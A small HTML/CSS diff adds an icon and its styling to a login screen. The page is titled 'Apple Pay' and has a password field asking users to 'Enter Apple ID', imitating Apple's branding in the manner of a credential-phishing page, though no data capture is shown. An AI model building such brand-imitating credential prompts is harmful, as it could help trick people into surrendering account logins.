@@ -13,6 +13,7 @@
 </head>
 <body>
     <div id="password-screen">
+        <img src="icon.png" alt="App Icon">
         <h1>Apple Pay</h1>
         <input type="password" id="password" placeholder="Enter Apple ID" oninput="checkPassword()">
         <p id="error-message"></p>
@@ -60,6 +61,12 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+        }
+
+        #password-screen img {
+            width: 100px; /* Set the icon width */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 20px; /* Space below the icon */
         }
 
         #password {
